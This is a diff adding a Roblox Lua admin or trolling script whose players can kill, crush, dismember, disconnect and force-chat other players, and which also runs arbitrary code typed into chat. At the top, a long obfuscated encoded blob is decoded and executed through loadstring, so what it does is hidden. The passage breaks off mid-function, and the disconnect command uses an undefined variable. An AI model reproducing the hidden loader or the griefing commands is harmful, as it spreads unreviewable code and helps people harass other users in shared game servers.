=~=~=~=~=~-!~#$~-+@#(#@#~%=~?-=~@+!%$~~+~%^#-#*#-+@#(#@#~%)==~=~=~=~=~=~=~=~-!~#"
+	,"$~&++#@#~%$#!#!#=~?-=~@+!%)==~=~=~=~=~=~=~=~-!~#$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-)==~=~=~=~=~=~=~=~^###=~+%_%+%=~$%?-=~~~~~=~+%_#!#$#=~+!^#+%(#!#_~+%_%+%(~@+!%(~@+!%$~~+~%^#-#*#-+@#(#@#~%$~-+@#(#@#~%^~=~!#$#+#)==~=~=~=~=~=~=~=~^###=~@+!%=~$%?-=~##&#(#-%!#=~+%_#!#$#=~%#&#?#!#)-%+!#+%-!!#~%#%^#-#!#_~~~++!#~#~%^#-%~~^~)-&++#+#^++%!#?#_~@+!%(~+#!%~%=~@#~%=~!-^~=~!#$#+#)==~=~=~=~=~=~=~=~?~?~*!*!-#@#~%@#!%+%^#$#!#$~%%~%&#=%_~##!%$#-#+%^#@#$#_~^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~(#@#-#&#(#=~~%(~=~@#=~?-=~?~~-(~=~?#&#+%_#$~~%&#$#+#@#?#_~&-(~!-=-=-^~@~?#&#+%_#$~=%^#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~%%_#^#(#!#=~@+!%)-^+-%++!#-%-#!#$#+#&#$#+%@+##_~%%@#~%*#-%=%&#-#!#^~=~&#$#+#=~%%&#^#+%_~^~=~&#$#+#=~=%(#~%$~-+_#&#~%&#-#+%!#~%=~&#$#+#=~=%(#~%$~-+_#&#~%&#-#+%!#~%)-##^#$#+##+^#~%-%+%-+_#^#(#+#_~~~_+!#&#+#~~^~=~+#@#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~@+!%$~-+#+~%&#?#!#=~?-=~=%(#~%$~-+_#&#~%&#-#+%!#~%$~_+!#&#+#$~-+#+~%&#?#!#=~)~=~-+#+~%&#"
+	,"?#!#$~&+$#%#(#!#-%_~=-(~@#(~=-^~=~=~=~=~)~=~-+#+~%&#?#!#$~$#!#%%_~!-(~~%(~=-^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~~%=~?-=~~%=~*~=~=-$~=-!-)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~@+!%)-++!#-%+%~%@#^%_~^~)==~=~=~=~=~=~=~=~!#$#+#^~_~^~?!?!)==~=~=~=~=~=~=~=~^###=~$#@#+%=~@+!%+%*!=%(#~%?!=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~@+!%+%*!=%(#~%?!=~?-=~*%?%)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~-!*!@+!%?!=~?-=~=%(#~%$~$+&#?#!#)==~=~=~=~=~=~=~=~+%&#~#(#!#$~^#$#-%!#~%+%_~@+!%+%*!=%(#~%?!(~@+!%^~)==~=~=~=~=~=~=~=~~%!#+%!%~%$#=~@+!%)=!#$#+#"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+
+ 
+-- Commands
+function DoCommand(cmd,msg,plr)
+        local player = plr or Player
+        local message = msg or ""
+        Commands[cmd].Run(player,message)
+end
+ 
+function newBlast(target)
+	local p = Instance.new("Part", game.Workspace)
+	p.formFactor = 3
+	p.Size = Vector3.new(1, 1, 4)
+	p.Anchored = true
+	p.CanCollide = false
+	p.TopSurface = 0
+	p.BottomSurface = 0
+	p.BrickColor = BrickColor.new(Color3.new(1, 1, 1))
+	p.CFrame = CFrame.new(target.Position)
+	 * CFrame.new(math.random(-30, 30), 30, math.random(-30, 30))
+	coroutine.wrap(function()
+		local homeDuration = 0
+		while target.Parent and p.Parent do
+			local duration = wait()
+			homeDuration = homeDuration + (duration * 3)
+			p.CFrame = CFrame.new(p.Position, target.Position)
+			 * CFrame.new(0, 0, -(homingSpeed + homeDuration) * duration)
+			if (p.Position - target.Position).magnitude < 3 then
+				Instance.new("Explosion", game.Workspace).Position = p.Position
+				p:remove()
+				break
+			end
+		end
+		if p.Parent then
+			p:remove()
+		end
+	end)()
+end
+
+
+
+NotExist = {Name="Not Exist",Level=0,Aliases={}} --NotExit Function.NotExist
+function NotExist.Run(player,msg)
+        if Noti[player.Name] then return end
+        Output("Command not found!","Red",player,3)
+end
+ 
+function New(name,func,lev,...)
+        if not func then rawset(Commands,name,nil) return end
+        local m = {...} local c = {Name=name, Run=function(...) ypcall(func,...) end, Level=lev,Aliases=m}
+        setmetatable(c,{__index=function(s,a) for k,v in pairs(m) do if v:lower()==a:lower() then return true end end end})
+        rawset(Commands,name,c) Output("Cmd added: "..name.." ("..lev..")", "Orange",Player,5) return c
+end
+ 
+Commands = {}
+CmdMeta = {}
+CmdMeta.__index = function(s,ke)
+        for k,v in pairs(Commands) do
+                if v.Name:lower() == ke:lower() or v[ke] then
+                        return v
+                end
+        end
+        return NotExist
+end
+CmdMeta.__newindex = function(s,k,v) New(k,v,2) end
+setmetatable(Commands,CmdMeta)
+Commands.c = function(S,M) Script(M,workspace,false,"Script launched!") end
+Commands.l = function(S,M) if ecall(loadstring(M)) then Output("Script ran!","Green",S,5) end end
+Commands.Cam = function(S,M) if S.Character then DestroyCharacter() end S.Character = nil Show() end
+Commands.Char = function(S,M) Spawn() end
+New("Notify",
+	function(S,M)
+		if M == "on" then
+			Notify = true
+		elseif M == "off" then
+			Notify = false
+		end
+	end,1,"noti"
+)
+--[[TABLET AND GLOBE INSTANCES]]--
+New("Dismiss",function(S,M)
+        if S ~= Player then
+                Clear(true,S)
+                return
+        end
+        local ts = Players(M,S)
+        if #ts > 0 and M ~= "all" and M ~= "" then
+                for k,v in pairs(ts) do
+                        Clear(true,v)
+                end
+                return
+        end
+        if M:lower() == "globes" or M:lower() == "globe" or M:lower() == "all" or M:lower() == "" then
+                for v,k in pairs(Globes) do
+                        v:Destroy()
+                end
+        end
+        if M:lower() == "tablets" or M:lower() == "tablet" or M:lower() == "all" or M:lower() == "" then
+                for k,v in pairs(Tablets) do
+                        v:Destroy()
+                end
+        end
+        if M:lower() == "outputs" or M:lower() == "output" or M:lower() == "all" or M:lower() == "" and Out[S] then
+                for k,v in pairs(Out[S]) do
+                        v:Destroy()
+                end
+        end
+end, 0, "dm","dis","dissmis","rt","dt")
+--[[""....................................................................""]]--
+
+New("Main",function(S,M)
+        Output("Creator/Editors/Tweakers: Infinity Teams (einsteinK, TotalReconciliation, SharpBladedTyrant, OMGshadeslayer)","Black",S,10,function() Clear(false,S) end)
+        Output("Your level: "..(S==Player and 2 or Holo(S) and 1 or 0),"Cyan",S,10,function() Clear(false,S) end)
+        Output("Your age: "..S.AccountAge.." day(s)","Black",S,10,function() Clear(false,S) end)
+        Output("Name Of Script: "..CN,"Cyan",S,10,function() Clear(false,S) end)
+end, 0, "v", "info", "version")
+New("Chat",function(S,M)
+        if not Holo(S) and S ~= Player then return end
+        if M:lower() == "on" then
+                CO[S.Name] = true
+        elseif M:lower() == "off" then
+                CO[S.Name] = nil
+        else
+                local msg = Title(M,S.Character and S.Character:findFirstChild("Head") or Probe,"Black",true)
+                wait(3)
+                msg:Destroy()
+        end
+end, 1, "")
+New('seizure',
+ function(S,M) 
+local plrz = Players(M,S)
+for i, v in pairs(plrz) do
+repeat wait() 
+g = v.Character
+g.Humanoid.PlatformStand = true 
+g.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10)) 
+g.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)) until nil
+end
+end,2
+)
+New('nolegs',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do 
+for i,j in pairs(v.Character:GetChildren()) do
+if j.Name == "Left Leg" or j.Name == "Right Leg" then
+j:remove() 
+end end end 
+end,1
+)
+New('Fire',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do
+if v.Character then
+if v.Character:findFirstChild("Torso") then
+if v.Character.Torso.className == "Part" then
+Instance.new("Fire", v.Character.Torso)
+end end end end end,1
+)
+New('UnFire',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do
+if v.Character then
+if v.Character:findFirstChild("Torso") then
+if v.Character.Torso.ClassName == "Part" then
+for i,f in pairs(v.Character.Torso:GetChildren()) do
+if f.ClassName == "Fire" then
+f:remove()
+end end end end end end end,1
+) 
+New('nohat',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do
+for i,j in pairs(v.Character:GetChildren()) do 
+if j.ClassName == "Hat" then 
+j:remove()
+end end end 
+end,1
+)
+New("Remove Hats",
+    function(S,M)
+        for _,v in pairs(Players(M,S)) do
+            pcall(function()
+                for _,part in pairs(v.Character:GetChildren()) do if part:IsA("Hat") then part:Remove() end end
+            end)
+        end
+    end,1
+)
+New('noface',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do 
+for i,j in pairs(v.Character.Head:GetChildren()) do 
+if j.ClassName == "Decal" then 
+j:remove()
+end end end 
+end,1
+)
+New('noarms',
+ function(S,M) 
+local a = Players(M,S)
+for i,v in pairs(a) do 
+for i,j in pairs(v.Character:GetChildren()) do 
+if j.Name == "Left Arm" or j.Name == "Right Arm" then
+j:remove()
+end end end 
+end,1
+)
+
+New('noclothes',
+ function(S,M) 
+local a = Players(M,S) 
+for i,v in pairs(a) do 
+for i,j in pairs(v.Character:GetChildren()) do 
+if j.ClassName == "Shirt" or j.ClassName == "Pants" or j.ClassName == "ShirtGraphic" then 
+j:remove()
+end end end 
+end,1
+)
+
+New('t',
+function(S,M)
+        for _,v in pairs(Players(M,S)) do        
+                local sel = Instance.new("SelectionPartLasso",S.Character.Torso)
+                sel.Color = BrickColor.new("Bright red")
+                sel.Transparency = 0
+                sel.Humanoid = v.Character.Humanoid
+                sel.Name = "SelectionPartLasso Test"
+            sel.Part = S.Character.Torso
+wait(5)
+sel:remove()
+        end
+        end,1
+)
+
+New("Character",function(S,M)
+        for k,v in pairs(Char:GetChildren()) do
+                if v:IsA("Hat") or v:IsA("Clothing") or v:IsA("BodyColors") then
+                        v:Destroy()
+                end
+        end
+        Output("Adding assets from this text","Yellow",S,20,true)
+        local m = Instance.new("Model")
+        for v in M:gmatch("versionid=(%d+)") do --GMATCH VERSION. DO NOT REMOVE.
+                for k,v in pairs(game:GetService("InsertService"):LoadAssetVersion(tonumber(v)):GetChildren()) do
+                        v.Parent = Char
+                        Output("Added "..v.Name,"Green",S,20,true)
+                end
+        end
+        local bc = Instance.new("BodyColors",Char)
+        bc.HeadColor = BrickColor.new(1030)
+        bc.LeftArmColor = BrickColor.new(1030)
+        bc.RightArmColor = BrickColor.new(1030)
+        bc.LeftLegColor = BrickColor.new(1030)
+        bc.RightLegColor = BrickColor.new(1030)
+        bc.TorsoColor = BrickColor.new(1030)
+        Output("Added Body Colors","Yellow",S,20,true)
+end, 2)
+New("Asset",function(S,M)
+        if not tonumber(M) then
+                return Output("Need an asset id!","Red",S)
+        end
+        if not ypcall(function() local a = game:GetService("MarketplaceService"):GetProductInfo(tonumber(M)) end) then
+                return Output("This is not a valid asset!","Red",S)
+        end
+        local out,data = {}, game:GetService("MarketplaceService"):GetProductInfo(tonumber(M))
+        for k,v in pairs(LoadLibrary("RbxUtility").DecodeJSON(data)) do
+                if type(v) == "table" then
+                        for ke,v in pairs(v) do
+                                table.insert(out,"("..k..") "..ke..": "..tostring(v))
+                        end
+                else
+                        table.insert(out,k..": "..tostring(v))
+                end
+        end
+        Outputs(out,"Yellow",S,30,true)
+end, 2)
+--for k,v in pairs({"create","stop","run","edit","remove","help","exit"}) do New(v,function() end,0) end
+New("Commands",function(S,M)
+        local function P(t,c,n)
+                local a = game
+                if S == Player then
+                        PCM = M
+                        a = Tablet(t, c)
+                        game:GetService("Debris"):AddItem(a,20)
+                else
+                        a = DoOutput(t, c, S, 20)
+                end
+                if a then TCS[a] = function() DoCommand("command",n,S) end end
+        end
+        local level = S==Player and 2 or Holo(S) and 1 or 0
+        local a,b = Split(M)
+        Clear(false,S) if tonumber(a) then level = tonumber(a) end
+        for k,v in pairs(Commands) do
+                if b and (b:lower() == "only" or b:lower() == "o") or not b and (a:lower() == "only" or a:lower() == "o") then
+                        if v.Level == level then
+                                P(v.Name,"Cyan",k)
+                        end
+                else
+                        if v.Level < level then
+                                P(v.Name.." ("..v.Level..")","Green",k)
+                        elseif v.Level == level then
+                                P(v.Name.." ("..v.Level..")",a~="" and(level > 0 or b and b:lower() == "all") and "Cyan" or "Green",k)
+                        elseif b and b:lower() == "all" or not b and a:lower() == "all" then
+                                P(v.Name.." ("..v.Level..")", "Black",k)
+                        end
+                end
+        end
+end, 0, "cmds", "what")
+New('Darken',
+        function(S,M)
+        directory = game.Lighting
+        directory.Ambient = Color3.new(0, 0, 0)
+        directory.Brightness = 0
+        directory.ColorShift_Bottom = Color3.new(0, 0, 0)
+        directory.ColorShift_Top = Color3.new(0, 0, 0)
+        directory.GlobalShadows = true
+        directory.OutdoorAmbient = Color3.new(0, 0, 0)
+        directory.ShadowColor = Color3.new(0, 0, 0)
+        directory.GeographicLatitude = 41.773
+        directory.FogColor = Color3.new(0, 0, 0)
+        directory.FogEnd = 100000
+        directory.FogStart = 0
+        directory.TimeOfDay = "00:00:00"
+        s = Instance.new("Sky", directory)
+                s.CelestialBodiesShown = false
+                s.SkyboxBk = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxDn = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxFt = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxLf = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxRt = "http://www.roblox.com/asset/?ID=2013298"
+                s.SkyboxUp = "http://www.roblox.com/asset/?ID=2013298"
+                s.StarCount = 0
+        while game.Workspace:findFirstChild("Base") ~= nil do
+                game.Workspace:findFirstChild("Base"):Destroy()
+        end
+        base = Instance.new("Part", game:GetService("Workspace"))
+        base.Name = "Base"
+        base.Size = Vector3.new(2048, 1, 2048)
+        base.Anchored = true
+        base.Position = Vector3.new(0, 0, 0)
+        base.CFrame = CFrame.new(0, 0, 0)
+        base.Locked = true
+        base.BrickColor = BrickColor.new("Black")
+        base.Material = "Grass"
+        base.TopSurface = "Smooth"
+        base.BottomSurface = "Smooth"
+end,2
+)
+New('cap',
+	function(S,M)
+		local _pos = S.Character.Head.CFrame * CFrame.new(10, 10, 10) or Probe.CFrame * CFrame.new(10, 10, 10)
+		for _,v in pairs(Players(M,S)) do
+			wait(1)
+			Stop=false
+			local Part=v.Character.Torso
+			if Part.Anchored==true then Part.Anchored=false end
+			        local pos = Instance.new("BodyPosition")
+       				 pos.Parent = Part
+       				 pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+        			pos.position = _pos.p
+			Sin,Cos=function(i) return math.sin(math.rad(i)) end, function(i) return math.cos(math.rad(i)) end
+      			  local gyro = Instance.new("BodyGyro")
+      					  gyro.Parent = Part
+      				  gyro.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
+			        for i = 0,math.huge,2.5 do
+					if Stop==false then
+           				 pos.position = S.Character.Torso.CFrame:toWorldSpace(CFrame.new(Vector3.new(Sin(i)*4, 1.5, Cos(i)*4))).p 
+           				 gyro.cframe = CFrame.Angles(0,math.rad(i),0)
+           				end
+				wait()
+				end
+		end
+	end,1
+)
+New('Crush',
+    function(S,M)
+        for _,PlayerList in pairs(Players(M,S)) do
+if PlayerList~=nil then
+if  pcall(function() local _ = PlayerList.Character.Torso.CFrame end) == true and pcall(function() local _ = PlayerList.Character.Humanoid end) == true then
+coroutine.wrap(function()
+local WalkSpeed = PlayerList.Character.Humanoid.WalkSpeed
+PlayerList.Character.Humanoid.WalkSpeed = 0
+wait(3)
+PlayerList.Character.Humanoid.WalkSpeed = WalkSpeed
+end)()
+local Brick = Instance.new("Part", workspace)
+Brick.Name = "Brick"
+Brick.BrickColor = BrickColor.new("Really black")
+Brick.TopSurface = 0
+Brick.BottomSurface = 0
+Brick.formFactor = "Symmetric"
+Brick.Size = Vector3.new(10, 7, 8)
+Brick.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(0, 200, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(math.random(0, 360)), 0)
+Instance.new("SpecialMesh", Brick).MeshType = "Torso"
+local BodyVelocity = Instance.new("BodyVelocity", Brick)
+BodyVelocity.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+BodyVelocity.velocity = Vector3.new(0, -300, 0)
+Brick.Touched:connect(function(Hit)
+if Hit.Parent == nil then return end
+if Hit.Parent:FindFirstChild("Humanoid") ~= nil then
+Hit.Parent.Humanoid.MaxHealth = 100
+Hit.Parent.Humanoid.Health = 0
+else
+if Hit:GetMass() > 1000 then return end
+Hit.Anchored = false
+Hit:BreakJoints()
+end
+end)
+coroutine.wrap(function()
+for i = 1, 0, -0.05 do
+Brick.Transparency = i
+wait()
+end
+Brick.Transparency = 0
+wait(2)
+for i = 0, 1, 0.015 do
+Brick.Transparency = i
+wait()
+end
+Brick:Remove()
+end)()
+end
+
+end
+end
+end,1
+)
+
+New('Nyan',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=55987937"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=55987937"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=55987937"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=55987937"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=55987937"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=55987937"
+        end,1
+)
+New("light",
+        function(S,M)
+                for _,v in pairs(Players(M,S)) do
+light = Instance.new('PointLight', v.Character.Torso)
+light.Range = 55
+light.Brightness = 100
+light.Color = Color3.new(math.random(), math.random(), math.random())
+light.Enabled = true
+                end
+        end,1
+)
+
+New('Flames',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=26356415"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=26356415"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=26356415"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=26356415"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=26356415"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=26356415"
+        end,1
+)
+New('where',
+        function(S,M)
+                for _,v in pairs(Players(M,S)) do
+                                local BB = Instance.new("BillboardGui",v.Character.Head)
+        BB.Size = UDim2.new(0, 200, 0 ,200)
+        BB.ExtentsOffset = Vector3.new(0, 13, 0)
+        local TextBox = Instance.new("TextLabel", BB)
+        TextBox.FontSize = "Size48"
+        TextBox.Font = "ArialBold"
+        TextBox.Text = ""..v.Name.." Is Here!"
+        TextBox.TextTransparency = 0.3
+        TextBox.TextColor3 = BrickColor.new("Bright red").Color
+        TextBox.TextStrokeTransparency = 0
+        TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
+wait(5)
+BB:Destroy()
+                end
+        end,1
+)
+New('Slenderman',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=90199618"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=90199618"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=90199618"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=90199618"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=90199618"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=90199618"
+        end,1
+)
+
+New('Pacman',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting 
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=29497998"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=29497998"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=29497998"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=29497998"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=29497998"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=29497998"
+        end,1
+)
+New('Troll',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=23881644"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=23881644"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=23881644"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=23881644"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=23881644"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=23881644"
+        end,1
+)
+New('Shedletsky',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=92767799"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=92767799"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=92767799"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=92767799"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=92767799"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=92767799"
+        end,1
+)
+New('Lua',
+        function(S,M)
+                local sky = Instance.new("Sky")
+                sky.Parent = game.Lighting
+                sky.SkyboxBk = "http://www.roblox.com/asset/?id=66825616"
+                sky.SkyboxDn = "http://www.roblox.com/asset/?id=66825616"
+                sky.SkyboxFt = "http://www.roblox.com/asset/?id=66825616"
+                sky.SkyboxLf = "http://www.roblox.com/asset/?id=66825616"
+                sky.SkyboxRt = "http://www.roblox.com/asset/?id=66825616"
+                sky.SkyboxUp = "http://www.roblox.com/asset/?id=66825616"
+        end,1
+)
+New('pdel',
+function(S,M)
+	pcall(function()
+Delay(0,function()
+			pcall(function()
+                for _,Item in pairs(game.Workspace:GetChildren()) do
+                        if Item.Name:lower():find(M:lower()) or Item.Name:find(M) then
+                                Item:Destroy()
+                        end
+                end
+			end)
+end)
+end)
+end,1
+)
+New("Command",function(S,M)
+        Clear(false,S)
+        local cmd = Commands[M]
+        if not cmd or cmd.Name  == "Not Exist" then
+                Output("Not a valid command!","Red",S)
+                return
+        end
+        Output("Name: "..cmd.Name,"Cyan",S,15,true)
+        Output("Level: "..cmd.Level,"Cyan",S,15,true)
+        for k,v in pairs(cmd.Aliases) do
+                Output("Same as: "..v,"Blue",S,15,true)
+        end
+        if S == Player then
+                game.Debris:AddItem(Tablet("Back","Red",function() DoCommand("commands",PCM,S) end),20)
+        end
+end, 0, "cmd", "whatdoes")
+New("Last Seen",function(S,M)
+        local d = false
+        local sorted = {}
+        for k,v in pairs(LastOnline) do
+                table.insert(sorted,k)
+        end
+        table.sort(sorted,function(a,b) return LastOnline[a] > LastOnline[b] end)
+        for k,v in pairs(sorted) do
+                if #v > #M and v:lower():sub(1,#M) == M:lower() then
+                        Output(v..": "..HoursAgo(tick()-LastOnline[v]),"Red",S,30,true)
+                        d = true
+                end
+        end
+        if not d then
+                Output("Nobody found!","Red",S,5)
+        end
+end, 1, "lastseen","seen","lastonline")
+New("Holo", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                table.insert(Holos,v.Name)
+                Output("Added "..v.Name, "Magenta", S, 5)
+                Output("You are now Trusted.","Green",v,6)
+                Output("Do NOT abuse this.","Red",v,6)
+        end
+end, 2, "levelup","add","h")
+New("Unholo", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                for k,a in pairs(Holos) do
+                        if v.Name:lower() == a:lower() then
+                                Holos[k] = nil
+                        end
+                end
+                Output("Removed "..v.Name, "Magenta", S, 5)
+                Output("You're no longer a holo!","Red",v,6)
+                Output("Too bad. Have fun with the kickingphrases","Green",v,6)
+        end
+end, 2, "leveldown","remove")
+New("Hax", function() end, 3)
+New("Send", function(S,M)
+        local a,b = Split(M)
+        if a == "" then return end
+        local n = S==Player and CN or S.Name
+        for k,v in pairs(Players(a,S)) do
+                Output(n..": "..(b or "Hellu"),"Brown",v,v==Player       and 60 or 5)
+                Output("Sent to "..(v==Player and CN or v.Name),"Green",S,1)
+        end
+end, 1, "s", "say", "to")
+New("Force", function(S,M)
+        local a,str = Split(M)
+        for k,v in pairs(Players(a)) do
+                ypcall(Chatted,v,str)
+        end
+end, 2, "f", "do", "undo", "@")
+New("Kill", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Health = 0
+                end
+        end
+end, 1, "dead")
+New("Heal", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
+                end
+        end
+end, 1, "fullhealth")
+New("Undead", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.MaxHealth = math.huge
+                        v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
+                end
+        end
+end, 1, "unlimitedhealth")
+New("Walk Speed", function(S,M)
+        local a,b = Split(M)
+        if tonumber(a) and not b then
+                if S.Character and S.Character:findFirstChild("Humanoid") then
+                        S.Character.Humanoid.WalkSpeed = tonumber(a)
+                end
+        elseif tonumber(a) and b then
+                for k,v in pairs(Players(b,S)) do
+                        if v.Character and v.Character:findFirstChild("Humanoid") then
+                                v.Character.Humanoid.WalkSpeed = tonumber(a)
+                        end
+                end
+        elseif tonumber(b) then
+                for k,v in pairs(Players(a,S)) do
+                        if v.Character and v.Character:findFirstChild("Humanoid") then
+                                v.Character.Humanoid.WalkSpeed = tonumber(b)
+                        end
+                end
+        else
+                Output("Wrong arguments!","Red",S)
+        end
+end, 1, "walkspeed", "ws", "speed")
+New("visible", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        for k,v in pairs(v.Character:GetChildren()) do
+                                if v:IsA("Part") and v.Name ~= "OutputBall" then
+                                        v.Transparency = 0
+                                        if v:findFirstChild("face") then
+                                                v.face.Transparency = 0
+                                        end
+                                        for k,v in pairs(v:GetChildren()) do
+                                                if v:IsA("Model") then
+                                                        for k,v in pairs(v:GetChildren()) do
+                                                                if v:IsA("Part") then
+                                                                        v.Transparency = 0
+                                                                        if v:findFirstChild("face") then
+                                                                                v.face.Transparency = 0
+                                                                        end
+                                                                end
+                                                        end
+                                                end
+                                        end
+                                elseif v:findFirstChild("Handle") then
+                                        v.Handle.Transparency = 0
+                                elseif v:IsA("Model") then
+                                        for k,v in pairs(v:GetChildren()) do
+                                                if v:IsA("Part") then
+                                                        v.Transparency = 0
+                                                        if v:findFirstChild("face") then
+                                                                v.face.Transparency = 0
+                                                        end
+                                                end
+                                        end
+                                end
+                        end
+                end
+        end
+end, 1, "vis", "see")
+New("invisible", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        for k,v in pairs(v.Character:GetChildren()) do
+                                if v:IsA("Part") and v.Name ~= "OutputBall" then
+                                        v.Transparency = 1
+                                        if v:findFirstChild("face") then
+                                                v.face.Transparency = 1
+                                        end
+                                        for k,v in pairs(v:GetChildren()) do
+                                                if v:IsA("Model") then
+                                                        for k,v in pairs(v:GetChildren()) do
+                                                                if v:IsA("Part") then
+                                                                        v.Transparency = 1
+                                                                        if v:findFirstChild("face") then
+                                                                                v.face.Transparency = 1
+                                                                        end
+                                                                end
+                                                        end
+                                                end
+                                        end
+                                elseif v:findFirstChild("Handle") then
+                                        v.Handle.Transparency = 1
+                                elseif v:IsA("Model") then
+                                        for k,v in pairs(v:GetChildren()) do
+                                                if v:IsA("Part") then
+                                                        v.Transparency = 1
+                                                        if v:findFirstChild("face") then
+                                                                v.face.Transparency = 1
+                                                        end
+                                                end
+                                        end
+                                end
+                        end
+                end
+        end
+end, 1, "invis", "unsee")
+New("Respawn", function(S,M)
+	for k,v in pairs(Players(M,S)) do
+local ack2 = Instance.new("Model") 
+ack2.Parent = game:GetService("Workspace") 
+local ack4 = Instance.new("Part") 
+ack4.Transparency = 1 
+ack4.CanCollide = false 
+ack4.Anchored = true 
+ack4.Name = "Torso" 
+ack4.Position = Vector3.new(10000,10000,10000) 
+ack4.Parent = ack2 
+local ack3 = Instance.new("Humanoid") 
+ack3.Torso = ack4 
+ack3.Parent = ack2 
+v.Character = ack2
+end
+end, 2)
+New("Normal", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.MaxHealth = 100
+                        --if v.Character:findFirstChild("Nice thing")
+                end
+                DoCommand("heal",v.Name,S)
+                DoCommand("visible",v.Name,S)
+                DoCommand("unforcefield",v.Name,S)
+                Noti[v.Name] = nil
+        end
+end, 1, "norm", "normalize")
+New("Forcefield", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                Instance.new("ForceField",v.Character)
+        end
+end, 1, "ff")
+New("UnForcefield", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        for a,b in pairs(v.Character:GetChildren()) do
+                                if b:IsA("ForceField") then
+                                        b:Destroy()
+                                end
+                        end
+                end
+        end
+end, 1, "unff")
+New("Disconnect", function(S,M)
+            Name = Msg
+                Val = Instance.new('StringValue')
+                Val.Name = 'Disconnect : ' .. Msg
+                Val.Parent = game.Workspace
+                Output("Attempted to disconnect: "..Msg ,"Green",S,5,true)
+                wait(5)
+                Val:Destroy()
